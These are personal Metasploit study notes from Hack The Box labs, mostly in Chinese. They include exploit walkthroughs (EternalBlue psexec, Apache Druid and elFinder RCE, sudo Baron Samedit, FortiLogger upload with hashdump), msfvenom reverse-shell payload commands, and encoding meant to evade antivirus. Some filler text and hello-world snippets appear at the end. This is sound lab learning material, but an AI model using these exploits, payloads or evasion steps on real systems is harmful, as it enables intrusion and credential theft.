---
title: Metasploit
description: some notes to metasploit from HTB
publish: true
tags:
  - 資安
  - 紅隊
featured_image: https://raw.githubusercontent.com/Ash0645/image_remote/main/metasploit_cheatsheet.png
created_date: 2025-05-06
---
`msfconsole` 啟動!

[Hack The Box - Using the Metasploit Framework_using the metasploit framework hackthebox-CSDN博客](https://blog.csdn.net/weixin_52134577/article/details/126361269)

>process
- Enumeration  枚舉
- Preparation  準備
- Exploitation  注入
- Privilege Escalation  特權升級
- Post-Exploitation  資訊整理

>Syntax

```
<No.> <type>/<os>/<service>/<name>
```

>type

|**Type  類型**|**Description  描述**|
|---|---|
|`Auxiliary`|Scanning, fuzzing, sniffing, and admin capabilities. Offer extra assistance and functionality.  <br>掃描，模糊，嗅探和管理功能。提供額外的幫助和功能。|
|`Encoders`|Ensure that payloads are intact to their destination.  <br>確保有效載荷完整到目的地。|
|`Exploits`|Defined as modules that exploit a vulnerability that will allow for the payload delivery.  <br>定義為利用漏洞的模塊，該漏洞將允許有效載荷交付。|
|`NOPs`|(No Operation code) Keep the payload sizes consistent across exploit attempts.  <br>（沒有操作代碼）保持有效載荷大小在漏洞嘗試中保持一致。|
|`Payloads`|Code runs remotely and calls back to the attacker machine to establish a connection (or shell).  <br>代碼遠程運行，並回電回攻擊機以建立連接（或外殼）。|
|`Plugins`|Additional scripts can be integrated within an assessment with `msfconsole` and coexist.  <br>可以將其他腳本與`msfconsole`和共有評估集成在一起。|
|`Post`|Wide array of modules to gather information, pivot deeper, etc.  <br>各種各樣的模塊，以收集信息，更深入的樞紐等。|

>search

可以加上關鍵篩選
```shell-session
search type:exploit platform:windows cve:2021 rank:excellent microsoft
```

>[!test]+ LAB01
>`nmap -sV 10.129.195.148`
>`use exploit(windows/smb/ms17_010_psexec) > `
>`set RHOSTS 10.129.195.148`
>`run`
>`shell`
>`cd Administrator/Desktop/`
>`type flag.txt`-->win裡面不能用cat
>this is l1
>this is l2
>
>this will fail

>[!bug]+ th
>rekkor
>
>ropgerko
>
>rjgoejp
>
>erogoopej
>
>regojerp
>
>erjjegj
>erpgpejo


>[!tip]+ msfconsole小技巧
>1. grep 要在前面 ex`grep -c meterpreter show payloads`
>2. 可以多加幾個grep
>3. 要用橋接MODE(VM)->設定VPN
>4. 確認網段 `ip a | grep tun0`
>5. 確認payload `set PAYLOAD linux/x64/shell_reverse_tcp`

>[!test]+ LAB2 payload
>`grep druid search apache`
>`use exploit(linux/http/apache_druid_js_rce)`
>`set PAYLOAD linux/x64/shell_reverse_tcp`
>`run`
>`pwd`
>`cd ..`
>`cat flag.txt`
>`HTB{MSF_Expl01t4t10n}`

>Encoder

encode payload to escape
diverse in x64/x86/sparc/pps/mips

ex. create a plain payload
```
user@htb$ msfvenom -a x86 --platform windows -p windows/shell/reverse_tcp LHOST=127.0.0.1 LPORT=4444 -b "\x00" -f perl
```

create an encoded payload
```
user@htb$ msfvenom -a x86 --platform windows -p windows/shell/reverse_tcp LHOST=127.0.0.1 LPORT=4444 -b "\x00" -f perl -e x86/shikata_ga_nai
```

可以結合`mfs-virustotal` 來看加密後的會不會被偵測到(需要先申請VT API)

>Database

```
sudo systemctl start postgresql

sudo msfdb init
sudo msfdb status
sudo msfdb run

sudo systemctl status postgresql
```

用`workspace`
`-a` 添加工作區
`-d` 刪除工作區

還有個`db_nmap`指令 :O

`hosts`：顯示目前資料庫中儲存的所有主機資訊
`services`：顯示目前資料庫中儲存的所有服務資訊
`creds`：顯示目前資料庫中儲存的所有與目標互動的憑證資訊
`loot`：顯示目前資料庫中儲存的所有使用者與服務的憑證，通常與 `creds` 命令搭配使用

>Plugins

依然是插件王者
`ls /usr/share/metasploit-framework/plugins`

其他資源: https://github.com/darkoperator/Metasploit-Plugins.git

啟動
`load <PLUG-IN>`

>Sessions

他可能是想tmux跟git的聰明小功能都搞了

`Ctrl+Z` 把session丟到背景
`sessions` 列出所有session
`sessions -i <No.>` 跟特定sesssion互動

>jobs

`jobs -l`
`jobs -K` kill all
`kill <NO.>`

>[!note]+ LAB3
>先從html看到它是一個elfinder系統在/#elf_l1_Lw下面
>看了一下有一個elFinder RCE(CVE-2019-9194)
>nmap:
>```txt
>PORT   STATE SERVICE VERSION
>22/tcp open  ssh     OpenSSH 8.2p1 Ubuntu 4ubuntu0.4 (Ubuntu Linux; protocol 2.0)
>80/tcp open  http    Apache httpd 2.4.41 ((Ubuntu))
>Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
>msf6 exploit(linux/http/elfinder_archive_cmd_injection) > set TARGETURI /#elf_l1_Lw
>TARGETURI => /#elf_l1_Lw
>msf6 exploit(linux/http/elfinder_archive_cmd_injection) > set LHOST 10.10.14.18
>LHOST => 10.10.14.18
>msf6 exploit(linux/http/elfinder_archive_cmd_injection) > set RHOST 10.129.38.184
>```
>這樣是進去了 但是顯示是`www-data` 需要提權到root
>然後我是小丑 其實這是sudo CVE
>```
>sudo -V
>Sudo version 1.8.31
>Sudoers policy plugin version 1.8.31
>Sudoers file grammar version 46
>Sudoers I/O plugin version 1.8.31
>```
>然後用session(`Ctrl+Z`)送到背景之後用`exploit(linux/local/sudo_baron_samedit)` 來執行POC
>最後會看到session這邊
>```
>Id  Name  Type                   Information               Connection
> --  ----  ----                   -----------               ----------
 >1         meterpreter x86/linux  www-data @ 10.129.38.184  10.10.14.18:4444 -> 10.129.38.184:36310 (10.129.38.184)
 >2         meterpreter x64/linux  root @ 10.129.38.184      10.10.14.18:4444 -> 10.129.38.184:36646 (10.129.38.184)
>```

>Meterpreter

>[!note]+ LAB04
>1. nmap
>```
>$ sudo nmap -sV 10.129.203.65
>Not shown: 995 closed tcp ports (reset)
>PORT     STATE SERVICE       VERSION
>135/tcp  open  msrpc         Microsoft Windows RPC
>139/tcp  open  netbios-ssn   Microsoft Windows netbios-ssn
>445/tcp  open  microsoft-ds?
>3389/tcp open  ms-wbt-server Microsoft Terminal Services
>5000/tcp open  http          Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
>Service Info: OS: Windows; CPE: cpe:/o:microsoft:windows
>```
>
>2. seek 5000 -> FortiLogger login page
>3. search metaspolit
>```
>msf6 > search fortilogger
>Matching Modules
>================
 >0  exploit/windows/http/fortilogger_arbitrary_fileupload  2021-02-26       normal  Yes    >FortiLogger Arbitrary File Upload Exploit
 >```
 >`$ use 0`
 >4. set Lhost/Rhost and run -> use shell
 >5. get username -> `whoami=nt authority\system`
 >6. get `htb-student` user hash -> `back to meterpreter` -> `hashdump` -> get it 
 
 ```c
#include <stdio.h>

int main() {
    printf("Hello, world!\n");
    return 0;
}
```

```html
<!DOCTYPE html>
<html>
  <body>
    <h1>Hello, world!</h1>
  </body>
</html>
```

```python
def greet(name):
    print(f"Hello, {name}!")

greet("World")
```


```asm
.section .data
msg: .asciz "Hello, world!\n"

.section .text
.global _start
_start:
    mov $1, %rax
    mov $1, %rdi
    lea msg(%rip), %rsi
    mov $14, %rdx
    syscall
```


```java
public class HelloWorld {
    public static void main(String[] args) {
        System.out.println("Hello, world!");
    }
}
```
